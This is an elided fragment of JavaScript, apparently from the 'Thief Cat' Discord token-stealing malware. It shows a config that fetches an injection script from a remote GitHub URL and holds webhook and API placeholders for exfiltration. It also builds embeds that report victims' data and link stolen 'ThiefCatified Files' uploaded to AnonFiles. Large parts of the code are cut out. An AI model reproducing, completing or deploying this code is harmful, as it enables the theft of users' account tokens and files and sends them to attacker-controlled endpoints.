...
var config = {
    ...
    injection_url: "https://raw.githubusercontent.com/FalseKSCH/Cat-MyInject/main/index.js",
    webhook: "%WEBHOOK%",
    Placed: "%API_URL%",
    Filter: {
        "urls": [
    ...
    if (!token) {
        ...
        var params = await makeEmbed({
            ...
            fields: [{
                ...
                name: "@Copyright",
                value: `[Thief Cat 2023 <a:caat:1130448857436782682>](https://github.com/FalseKSCH/ThiefCat)`,
                inline: !0
            }, {
        ...
        if (!token) {
            ...
            var params = await makeEmbed({
                ...
                fields: [{
                    ...
                    name: "@Copyright",
                    value: `[Thief Cat 2023 <a:caat:1130448857436782682>](https://github.com/FalseKSCH/Thief-Cat)`,
                    inline: !0
                }, {
                    name: "ThiefCatified Files",
                    value: `[AnonFiles <:anonfiles:1130451891139133480>](${config.transfer_link})`,
